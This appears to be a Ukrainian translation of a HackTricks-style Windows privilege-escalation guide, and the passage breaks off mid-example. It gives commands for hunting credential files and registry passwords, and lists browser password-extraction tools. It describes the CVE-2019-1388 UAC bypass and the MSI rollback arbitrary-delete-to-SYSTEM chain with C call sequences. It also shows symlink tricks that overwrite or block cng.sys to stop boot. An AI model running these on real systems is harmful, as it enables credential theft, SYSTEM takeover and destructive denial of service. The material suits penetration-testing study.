Бази даних Password Safe v3 зазвичай мають розширення `.psafe3`. Вважайте файл із відповідною назвою кандидатом на зашифроване сховище; сам факт його наявності не означає, що ви можете його прочитати, розблокувати або скористатися збереженими обліковими даними. Перевіряючи місця зберігання таких файлів, перегляньте доступні профілі користувачів і налаштовані кореневі каталоги спільного доступу до файлів.

Файл KeePass `.kdbx`, який можна прочитати, так само є лише зачіпкою на зашифроване сховище. Щоб його розблокувати, потрібен справжній майстер-пароль і будь-який налаштований файл ключа чи фактори облікового запису. Якщо під час авторизованої перевірки в записі знайдено пару хешів LM:NT, перш ніж розглядати [pass-the-hash](../ntlm/README.md#pass-the-hash), перевірте названий обліковий запис і з'ясуйте, чи є хеш NT актуальним і чи приймає його служба NTLM цільової системи. Запис у сховищі сам по собі не надає прав Administrator або SYSTEM; також мають бути забезпечені віддалений доступ до служби, права облікового запису та окремий крок виконання служби, якщо він потрібен. В інвентаризації вказуйте шлях до сховища й можливість його прочитати, але не виводьте базу даних або збережені облікові дані.

Знайдіть усі запропоновані файли:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Облікові дані в Кошику

Перевірте доступні записи Кошика на наявність видалених резервних копій і архівів конфігурацій, а також файлів, у назвах яких прямо згадуються облікові дані. Корисна резервна копія `.7z`, `.zip` або `.rar` може бути створена кілька місяців тому й мати звичайну назву. Windows зберігає початковий шлях і час видалення в записі `$I`, а видалений файл — у відповідному записі `$R`; перш ніж відкривати архів, перевірте метадані та наявність у поточного користувача доступу на читання. Видимість залежить від тому, SID користувача та дозволів на файли, тому порожній список не доводить, що відновлюваної резервної копії немає. Розглядайте назву архіву як підставу для перевірки, а не як доказ того, що він містить дійсний секрет.

Доступний видалений файл `.pfx` також може бути зачіпкою для **підписування коду**. Якщо він містить доступний закритий ключ, цим ключем можна підписати змінений сценарій PowerShell; [PowerShell вимагає сертифікат для підписування коду із закритим ключем](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), а [правила видавця AppLocker перевіряють особу підписувача та область дії правила](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Для виконання сценарію від імені іншого облікового запису потрібно, щоб поточний користувач міг змінити саме цей сценарій, чинне правило приймало отриманий підпис для сценарію та цільового облікового запису, а завдання планувальника або інший процес із вищими привілеями справді його запускав. Сама лише назва файлу `.pfx`, тема сертифіката чи можливість запису в сценарій не підтверджують наявність усього цього ланцюжка. Перш ніж відкривати матеріали із закритим ключем або запускати завдання, перевірте метадані, ACL, політику та команду запуску.

Також перевірте доступні бази даних профілів клієнтів обміну повідомленнями, нотатки та отримані файли на наявність зачіпок щодо облікових даних. Експорт ключа відновлення BitLocker може зберігатися як HTML або TXT, іноді всередині архіву резервної копії з відповідною назвою. Такі матеріали можуть надати доступ до окремого зашифрованого тому даних зі старішими резервними копіями; перевіряйте том і архів лише за наявності дозволу на доступ. Якщо резервна копія містить `NTDS.dit`, для відновлення облікових даних домену в автономному режимі також потрібен відповідний вулик `SYSTEM`, як описано в [процесі роботи з резервними копіями та привілейованими групами](../active-directory-methodology/privileged-groups-and-token-privileges.md). Назви файлів і заблокований том самі по собі не доводять наявності придатного ключа відновлення чи резервної копії домену.

Щоб **відновити паролі**, збережені в кількох програмах, можна скористатися: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Усередині реєстру

**Інші можливі ключі реєстру з обліковими даними**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Вилучення ключів OpenSSH з реєстру.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Історія браузерів

Перевірте бази даних, де можуть зберігатися паролі з **Chrome, Edge або Firefox**.\
Також перевірте історію, закладки та вибране у браузерах: там можуть зберігатися **паролі**.

Для стандартного профілю Edge **Default** поточного користувача файл `Login Data` розташований у `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, а `Local State` — у батьківському каталозі `User Data`. [Microsoft описує стандартне розташування профілю](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); інший профіль або політика `UserDataDir` можуть змінити це розташування. Наявність файлів — лише підказка щодо сховища облікових даних: перевірте, чи доступні файли для читання, чи маєте ви контекст DPAPI відповідного користувача або інший дозволений ключовий матеріал, а також чи належить збережений логін обліковому запису з вищими привілеями. Перелік лише шляхів не вимагає відкривати базу даних або виводити розшифровані паролі.

Для Firefox [Mozilla описує](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), що `key4.db` і `logins.json` у профілі — це відповідно файл ключа та файл із зашифрованими логінами. Їхня наявність — лише підказка: перевірте, чи обидва файли доступні для читання, чи є збережені записи та чи захищений ключ Primary Password, перш ніж робити висновок, що облікові дані можна використати. Якщо відновлені облікові дані належать доменному обліковому запису, окремо перевірте ефективні права цього облікового запису на керування групами та [права групи на читання або розшифрування пароля LAPS](../active-directory-methodology/laps.md); самі артефакти браузера не доводять наявність шляху до прав адміністратора.

Інструменти для вилучення паролів із браузерів:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** — це технологія, вбудована в операційну систему Windows, яка забезпечує **взаємодію** між програмними компонентами, написаними різними мовами. Кожен компонент COM **ідентифікується за допомогою ідентифікатора класу (CLSID)**, а його функціональність надається через один або кілька інтерфейсів, що ідентифікуються за допомогою ідентифікаторів інтерфейсів (IID).

Класи та інтерфейси COM визначаються в реєстрі, відповідно, у розділах **HKEY\CLASSES\ROOT\CLSID** і **HKEY\CLASSES\ROOT\Interface**. Цей розділ реєстру створюється шляхом злиття **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

У CLSID цього розділу реєстру можна знайти дочірній розділ **InProcServer32**, який містить **значення за замовчуванням** із посиланням на **DLL**, а також значення **ThreadingModel**, яке може бути **Apartment** (однопотокова модель), **Free** (багатопотокова модель), **Both** (одно- або багатопотокова модель) чи **Neutral** (потоконезалежна модель).

![Історія браузерів — COM DLL Overwriting: у CLSID цього розділу реєстру можна знайти дочірній розділ InProcServer32, який містить значення за замовчуванням із посиланням на DLL і значення...](<../../images/image (729).png>)

Загалом, якщо ви можете **перезаписати будь-яку з DLL**, які виконуватимуться, то зможете **підвищити привілеї**, якщо цю DLL запускатиме інший користувач.

Щоб дізнатися, як зловмисники використовують COM Hijacking як механізм закріплення, дивіться:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Пошук паролів у файлах і реєстрі**

**Пошук вмісту файлів**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Пошук файлу з певною назвою**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Шукайте в реєстрі назви ключів і паролі**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Інструменти для пошуку паролів

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **— це плагін для msf**, який я створив, щоб **автоматично запускати кожен POST-модуль metasploit, що шукає облікові дані** на комп’ютері жертви.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) автоматично шукає всі файли з паролями, згадані на цій сторінці.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) — ще один чудовий інструмент для вилучення паролів із системи.

Інструмент [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) шукає **сеанси**, **імена користувачів** і **паролі** для кількох інструментів, які зберігають ці дані у відкритому тексті (PuTTY, WinSCP, FileZilla, SuperPuTTY і RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Витік дескрипторів

Уявіть, що **процес, запущений від імені SYSTEM, відкриває новий процес** (`OpenProcess()`) із **повним доступом**. Той самий процес **також створює новий процес** (`CreateProcess()`) **із низькими привілеями, але той успадковує всі відкриті дескриптори основного процесу**.\
Тоді, якщо у вас є **повний доступ до процесу з низькими привілеями**, ви можете отримати **відкритий дескриптор привілейованого процесу**, створений за допомогою `OpenProcess()`, і **ін’єктувати shellcode**.\
[Ознайомтеся з цим прикладом, щоб дізнатися більше про **виявлення та експлуатацію цієї вразливості**.](leaked-handle-exploitation.md)\
[Ознайомтеся з цим **іншим дописом, де детальніше пояснюється, як перевіряти та зловживати іншими відкритими дескрипторами процесів і потоків, успадкованими з різними рівнями дозволів (не лише з повним доступом)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Імперсонація клієнта Named Pipe

Сегменти спільної пам’яті, які називаються **каналами**, дають змогу процесам обмінюватися даними.

Windows має функцію **Named Pipes**, яка дає змогу не пов’язаним між собою процесам обмінюватися даними, навіть через різні мережі. Це схоже на архітектуру клієнт/сервер, у якій є ролі **сервера named pipe** та **клієнта named pipe**.

Коли **клієнт** надсилає дані через канал, **сервер**, який налаштував канал, може **перейняти особу** **клієнта**, якщо має необхідні права **SeImpersonate**. Виявивши **привілейований процес**, який обмінюється даними через канал, що ви можете імітувати, ви отримуєте змогу **підвищити привілеї**, перейнявши особу цього процесу, коли він взаємодіятиме зі створеним вами каналом. Інструкції з виконання такої атаки можна знайти [**тут**](named-pipe-client-impersonation.md) і [**тут**](#from-high-integrity-to-system).

Також наведений нижче інструмент дає змогу **перехоплювати обмін даними через named pipe за допомогою такого інструмента, як Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **а цей інструмент дає змогу переглядати всі канали й знаходити privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Віддалений запис DWORD через Telephony tapsrv до RCE

Служба Telephony (TapiSrv) у режимі сервера відкриває `\\pipe\\tapsrv` (MS-TRP). Віддалений автентифікований клієнт може зловживати асинхронним шляхом подій на основі mailslot, щоб перетворити `ClientAttach` на довільний **запис 4 байтів** у будь-який наявний файл, доступний для запису користувачу `NETWORK SERVICE`, а потім отримати права адміністратора Telephony і завантажити довільну DLL як службу. Повний сценарій:

- Викликати `ClientAttach`, задавши для `pszDomainUser` наявний доступний для запису шлях → служба відкриє його через `CreateFileW(..., OPEN_EXISTING)` і використовуватиме для запису асинхронних подій.
- Кожна подія записує в цей дескриптор контрольований зловмисником `InitContext` із `Initialize`. Зареєструвати line app за допомогою `LRegisterRequestRecipient` (`Req_Func 61`), викликати `TRequestMakeCall` (`Req_Func 121`), отримати дані через `GetAsyncEvents` (`Req_Func 0`), а потім скасувати реєстрацію та завершити роботу, щоб повторювати детерміновані записи.
- Додати себе до `[TapiAdministrators]` у `C:\Windows\TAPI\tsec.ini`, повторно підключитися, а потім викликати `GetUIDllName` із довільним шляхом до DLL, щоб виконати `TSPI_providerUIIdentify` від імені `NETWORK SERVICE`.

Докладніше:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Різне

### Розширення файлів, які можуть запускати код у Windows

Перегляньте сторінку **[https://filesec.io/](https://filesec.io/)**

### Зловживання обробниками протоколів / ShellExecute через рендерери Markdown

Клікабельні посилання Markdown, передані до `ShellExecuteExW`, можуть запускати небезпечні URI-обробники (`file:`, `ms-appinstaller:` або будь-яку зареєстровану схему) та виконувати файли під контролем зловмисника від імені поточного користувача. Дивіться:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Моніторинг командних рядків на наявність паролів**

Коли ви отримуєте shell від імені користувача, можуть виконуватися заплановані завдання або інші процеси, які **передають облікові дані в командному рядку**. Наведений нижче скрипт кожні дві секунди збирає командні рядки процесів і порівнює поточний стан із попереднім, виводячи всі відмінності.

```bash
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

## Викрадення паролів із процесів

## Від користувача з низькими привілеями до NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

Якщо у вас є доступ до графічного інтерфейсу (через консоль або RDP) і UAC увімкнено, у деяких версіях Microsoft Windows можна запустити термінал або будь-який інший процес від імені "NT\AUTHORITY SYSTEM", використовуючи обліковий запис користувача без привілеїв.

Це дає змогу одночасно підвищити привілеї та обійти UAC, використовуючи ту саму вразливість. Крім того, нічого не потрібно встановлювати, а бінарний файл, який використовується під час процесу, підписаний і випущений Microsoft.

Ось деякі з уразливих систем:

```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```

Щоб використати цю вразливість, необхідно виконати такі кроки:

```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```

У вас є всі необхідні файли та інформація в цьому репозиторії GitHub:

https://github.com/jas502n/CVE-2019-1388<sup>[[35]](#references)</sup>

## Від Administrator Medium до High Integrity Level / обхід UAC

Прочитайте це, щоб **дізнатися про рівні цілісності**:


{{#ref}}
integrity-levels.md
{{#endref}}

Потім **прочитайте це, щоб дізнатися про UAC та обходи UAC:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## Junction-и каталогу завантаження у корінь, доступний через вебсервер

Застосунок може створити передбачуваний підкаталог для завантажень, записати до нього ім’я файлу, надане користувачем, а потім обробити файл. Якщо користувач із низькими привілеями може видалити цей підкаталог і замінити його NTFS junction до серверного запису файлу, запис може перейти за junction у каталог, доступний через вебсервер. Розміщений там скрипт може виконуватися з обліковим записом вебслужби, якщо сервер виконує файли цього типу. Це специфічна для застосунку межа довільного запису; сам факт наявності каталогу для запису або вже наявного junction цього не доводить.

Перевірте точне формування шляху й час виконання обробника завантажень, ефективні права користувача на видалення та створення підкаталогу, ефективні ACL цільового каталогу, чи переходить механізм запису за reparse points і чи виконує вебсервер файли в цільовому каталозі. Окремо підтвердьте ідентичності процесів механізму запису та вебсервера. Пасивна інвентаризація може показати ACL каталогів і метадані reparse point, але не може встановити поведінку обробника чи майбутню підміну junction. Якщо виконання відбувається в обліковому записі служби, перевірте **фактичний токен процесу**, перш ніж розглядати окремий шлях через привілеї токена.

## Від довільного видалення/переміщення/перейменування папок до SYSTEM EoP

Техніка описана [**у цій публікації блогу**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks), а код експлойта [**доступний тут**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).<sup>[[31]](#references)[[32]](#references)</sup>

Атака полягає у зловживанні функцією відкату Windows Installer, щоб під час видалення замінити легітимні файли шкідливими. Для цього зловмисник має створити **шкідливий інсталятор MSI**, який буде використано для перехоплення каталогу `C:\Config.Msi`. Пізніше Windows Installer використовуватиме його для зберігання файлів відкату під час видалення інших пакетів MSI; файли відкату буде змінено так, щоб вони містили шкідливий payload.

### Ін'єкція шляху очищення Windows Installer COM (CVE-2025-27727)

Клієнт із низькими привілеями може звернутися до служби SYSTEM `msiexec.exe` через об’єкт COM `CMsiConfigurationManager` (CLSID/IID `{000C101C-0000-0000-C000-000000000046}`). Зворотний аналіз визначив відповідні виклики `IMsiServer`: `MsiBeginTransactionW` зі зміщенням `0xA0` у vtable, `SetEEUIDirectoryAndFilter` зі зміщенням `0xC8` і `CleanupTempPackages` зі зміщенням `0x50`. Ці назви та зміщення визначено зворотним аналізом, і вони можуть відрізнятися між збірками.<sup>[[41]](#references)</sup>

Для користувача, який не є адміністратором, `SetEEUIDirectoryAndFilter` імперсоніфікує клієнта лише під час відкриття вказаного шляху з прапорцями `DELETE`, `FILE_FLAG_BACKUP_SEMANTICS` і `FILE_FLAG_OPEN_REPARSE_POINT`. Це підтверджує, що клієнт може видалити каталог, і запобігає переходу за reparse point, але **не** прив’язує перевірений файловий об’єкт до подальшого очищення й не доводить, що його створив Windows Installer.<sup>[[41]](#references)</sup>

Після `MsiBeginTransactionW` метод `SetEEUIDirectoryAndFilter` додає шлях до черги як папку незалежно від переданого клієнтом аргументу фільтра. Служба записує іменоване значення `REG_DWORD` у `HKLM\Software\Microsoft\Windows\CurrentVersion\Installer\TempPackages`: ім’я значення — контрольований клієнтом шлях, а дані `0x00000002` — прапорець папки. Потім `CleanupTempPackages(NULL, FALSE)` безпосередньо запускає очищення. Підвищений воркер перелічує значення реєстру та передає записи папок рекурсивній функції `FDeleteFolder`, не перевіряючи походження шляхів. Якщо звичайне видалення не вдається, код також викликає `LockdownPath`, очищує атрибути файлу й повторює спробу.<sup>[[41]](#references)</sup>

Мінімальна послідовність викликів, відновлена з `msi.dll`:<sup>[[41]](#references)</sup>

```c
CreateDirectoryW(L"C:\\Config.Msi", NULL);
HANDLE hDir = CreateFileW(L"C:\\Config.Msi",
    GENERIC_READ | WRITE_DAC | READ_CONTROL | DELETE,
    FILE_SHARE_READ, NULL, OPEN_EXISTING,
    FILE_FLAG_BACKUP_SEMANTICS, NULL);
CMsiConfigurationManager *server = CreateMsiServer();
server->MsiBeginTransactionW(L"PoC", 0, hWnd, &hTransaction);
server->SetEEUIDirectoryAndFilter(L"C:\\Config.Msi", 0);
server->CleanupTempPackages(NULL, FALSE);
```

Корисний примітив тут — повторне використання шляху, а не перенаправлення через junction. Зареєструйте створений зловмисником `C:\Config.Msi`, видаліть його й дочекайтеся, поки Windows Installer пізніше повторно створить цей самий шлях із захищеними даними для відкату. Під час очищення система довіряє застарілому імені `TempPackages` і видаляє нову директорію від імені SYSTEM. Це обходить передбачений бар’єр, створений за допомогою `FILE_FLAG_OPEN_REPARSE_POINT` і захисту від перенаправлень, оскільки reparse point не потрібен.<sup>[[41]](#references)</sup>

Цей примітив видалення вписується в наведений нижче ланцюжок відкату: збережіть окремий запис `Installer\Folders`, видаліть захищений `C:\Config.Msi`, створіть його з NULL DACL і збережіть дескриптор із правом `WRITE_DAC`, відкритий до того, як інсталятор захистить DACL. Попередньо відкритий дескриптор може відновити дозвільну DACL за допомогою `NtSetSecurityObject`, після чого згенерований `.rbs` можна замінити до відновлення відкату.<sup>[[41]](#references)</sup>

Microsoft виправила цю проблему, заборонивши `CMsiTransaction::SetEEUIDirectoryAndFilter` викликати `ScheduleFileOrFolderDelete`, коли ввімкнено новий feature gate. COM-виклик усе ще може повертати успіх, але контрольований зловмисником шлях більше не додається до `TempPackages`. Установіть оновлення безпеки Windows за квітень 2025 року, а не використовуйте успішне повернення методу як ознаку встановленого виправлення.<sup>[[41]](#references)[[42]](#references)</sup>

Підсумована техніка така:

1. **Етап 1 — Підготовка до перехоплення (залиште `C:\Config.Msi` порожньою)**

- Крок 1: Установіть MSI
    - Створіть `.msi`, який установлює нешкідливий файл (наприклад, `dummy.txt`) у доступну для запису папку (`TARGETDIR`).
    - Позначте інсталятор як **"UAC Compliant"**, щоб його міг запускати **неадміністратор**.
    - Після встановлення залиште відкритим **дескриптор** файлу.

- Крок 2: Почніть видалення
    - Видаліть той самий `.msi`.
    - Процес видалення почне переміщувати файли до `C:\Config.Msi` і перейменовувати їх на файли `.rbf` (резервні копії для відкату).
    - **Опитуйте відкритий дескриптор файлу** за допомогою `GetFinalPathNameByHandle`, щоб визначити, коли файл стане `C:\Config.Msi\<random>.rbf`.

- Крок 3: Власна синхронізація
    - `.msi` містить **власну дію видалення (`SyncOnRbfWritten`)**, яка:
        - Сигналізує, коли файл `.rbf` записано.
        - Потім **чекає** на іншу подію, перш ніж продовжити видалення.

- Крок 4: Заблокуйте видалення `.rbf`
    - Отримавши сигнал, **відкрийте файл `.rbf`** без `FILE_SHARE_DELETE` — це **не дасть його видалити**.
    - Потім **надішліть сигнал у відповідь**, щоб видалення могло завершитися.
    - Windows Installer не зможе видалити `.rbf`, і оскільки він не зможе видалити весь вміст, **`C:\Config.Msi` не буде видалено**.

- Крок 5: Видаліть `.rbf` вручну
    - Видаліть файл `.rbf` вручну.
    - Тепер **`C:\Config.Msi` порожня** й готова до перехоплення.

> На цьому етапі **активуйте вразливість довільного видалення папки з рівнем привілеїв SYSTEM**, щоб видалити `C:\Config.Msi`.

2. **Етап 2 — Заміна скриптів відкату на шкідливі**

- Крок 6: Повторно створіть `C:\Config.Msi` зі слабкими ACL
    - Самостійно створіть папку `C:\Config.Msi` повторно.
    - Задайте **слабкі DACL** (наприклад, Everyone:F) і **залиште відкритим дескриптор** із правом `WRITE_DAC`.

- Крок 7: Запустіть інше встановлення
    - Знову встановіть `.msi`, указавши:
        - `TARGETDIR`: доступне для запису розташування.
        - `ERROROUT`: змінну, яка спричиняє примусову помилку.
    - Це встановлення буде використано, щоб знову запустити **відкат**, який читає `.rbs` і `.rbf`.

- Крок 8: Відстежуйте появу `.rbs`
    - Використовуйте `ReadDirectoryChangesW`, щоб відстежувати `C:\Config.Msi`, доки не з’явиться новий `.rbs`.
    - Збережіть його ім’я.

- Крок 9: Синхронізуйтеся перед відкатом
    - `.msi` містить **власну дію встановлення (`SyncBeforeRollback`)**, яка:
        - Сигналізує про створення `.rbs`.
        - Потім **чекає**, перш ніж продовжити.

- Крок 10: Повторно застосуйте слабкі ACL
    - Після отримання події ` .rbs created`:
        - Windows Installer **повторно застосовує суворі ACL** до `C:\Config.Msi`.
        - Але оскільки у вас усе ще є дескриптор із правом `WRITE_DAC`, ви можете **знову застосувати слабкі ACL**.

> ACL **перевіряються лише під час відкриття дескриптора**, тож ви все ще можете записувати до папки.

- Крок 11: Розмістіть підроблені `.rbs` і `.rbf`
    - Перезапишіть файл `.rbs` **підробленим скриптом відкату**, який указує Windows:
        - Відновити ваш файл `.rbf` (шкідливу DLL) у **привілейоване розташування** (наприклад, `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
    - Розмістіть підроблений `.rbf` зі **шкідливою DLL, корисним навантаженням для SYSTEM**.

- Крок 12: Запустіть відкат
    - Подайте сигнал події синхронізації, щоб інсталятор продовжив роботу.
    - **Власну дію типу 19 (`ErrorOut`)** налаштовано на **навмисне переривання встановлення** у відомий момент.
    - Це запускає **відкат**.

- Крок 13: SYSTEM установлює вашу DLL
    - Windows Installer:
        - Читає ваш шкідливий `.rbs`.
        - Копіює вашу DLL із `.rbf` у цільове розташування.
    - Тепер ваша **шкідлива DLL розташована за шляхом, із якого її завантажує SYSTEM**.

- Останній крок: Виконайте код від імені SYSTEM
    - Запустіть довірений **автоматично підвищений бінарний файл** (наприклад, `osk.exe`), який завантажить перехоплену вами DLL.
    - **Готово**: ваш код виконується **від імені SYSTEM**.


### Від довільного видалення/переміщення/перейменування файлів до SYSTEM EoP

Основна техніка відкату MSI (попередня) передбачає, що ви можете видалити **цілу папку** (наприклад, `C:\Config.Msi`). Але що, якщо ваша вразливість дає змогу лише **довільно видаляти файли**?

Можна використати **внутрішню будову NTFS**: кожна папка має прихований альтернативний потік даних із назвою:

```
C:\SomeFolder::$INDEX_ALLOCATION
```

Цей потік зберігає **метадані індексу** папки.

Тож якщо **видалити потік `::$INDEX_ALLOCATION`** папки, NTFS **видалить усю папку** з файлової системи.

Це можна зробити за допомогою стандартних API для видалення файлів, наприклад:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```

> Навіть якщо ви викликаєте API видалення *файлу*, він **видаляє саму папку**.

### Від видалення вмісту папки до SYSTEM EoP
Що, якщо ваш примітив не дозволяє видаляти довільні файли/папки, але **дозволяє видаляти *вміст* папки, контрольованої зловмисником**?

1. Крок 1: Створіть папку-приманку та файл
- Створіть: `C:\temp\folder1`
- Усередині неї: `C:\temp\folder1\file1.txt`

2. Крок 2: Встановіть **oplock** на `file1.txt`
- **Oplock** **призупиняє виконання**, коли привілейований процес намагається видалити `file1.txt`.

```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```

3. Крок 3: Запустити процес SYSTEM (наприклад, `SilentCleanup`)
- Цей процес сканує папки (наприклад, `%TEMP%`) і намагається видалити їхній вміст.
- Коли він дійде до `file1.txt`, **oplock спрацює** і передасть керування вашому callback.

4. Крок 4: Усередині callback oplock — перенаправити видалення

- Варіант A: Перемістити `file1.txt` в інше місце
    - Це спорожнить `folder1`, не порушивши oplock.
    - Не видаляйте `file1.txt` безпосередньо — це передчасно звільнить oplock.

- Варіант B: Перетворити `folder1` на **junction**:

```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```

- Варіант C: Створіть **symlink** у `\RPC Control`:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```

> Це спрямовано на внутрішній потік NTFS, у якому зберігаються метадані папки — його видалення видаляє папку.

5. Крок 5: Release the oplock
- Процес SYSTEM продовжує роботу й намагається видалити `file1.txt`.
- Але тепер через junction + symlink він насправді видаляє:
```
C:\Config.Msi::$INDEX_ALLOCATION
```

**Результат**: `C:\Config.Msi` видалено користувачем SYSTEM.

### Від довільного створення папки до постійного DoS

Скористайтеся примітивом, який дає змогу **створити довільну папку від імені SYSTEM/admin** — навіть якщо **ви не можете записувати файли** або **встановлювати слабкі дозволи**.

Створіть **папку** (не файл) з назвою **критичного драйвера Windows**, наприклад:
```
C:\Windows\System32\cng.sys
```

- Цей шлях зазвичай відповідає драйверу режиму ядра `cng.sys`.
- Якщо **заздалегідь створити його як папку**, Windows не зможе завантажити справжній драйвер під час запуску.
- Потім Windows намагається завантажити `cng.sys` під час запуску.
- Вона бачить папку, **не може знайти справжній драйвер** і **аварійно завершує роботу або зупиняє завантаження**.
- **Резервного варіанта немає**, і **відновлення без зовнішнього втручання** (наприклад, відновлення завантаження або доступу до диска) **неможливе**.

### Від привілейованих шляхів журналів/резервних копій і OM symlinks до довільного перезапису файлів / DoS під час завантаження

Коли **привілейована служба** записує журнали/експорти за шляхом, прочитаним із **доступного для запису конфігураційного файла**, перенаправте цей шлях за допомогою **Object Manager symlinks + точок монтування NTFS**, щоб перетворити привілейований запис на довільний перезапис (навіть **без SeCreateSymbolicLinkPrivilege**).<sup>[[15]](#references)</sup>

**Вимоги**
- Конфігураційний файл із цільовим шляхом доступний для запису зловмиснику (наприклад, `%ProgramData%\...\.ini`).
- Можливість створити точку монтування до `\RPC Control` і файлове посилання OM (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools)).<sup>[[16]](#references)[[17]](#references)</sup>
- Привілейована операція, яка записує за цим шляхом (журнал, експорт, звіт).

**Приклад ланцюжка**
1. Прочитайте конфігураційний файл, щоб визначити привілейоване розташування журналу, наприклад, `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` у `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. Перенаправте шлях без прав адміністратора:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
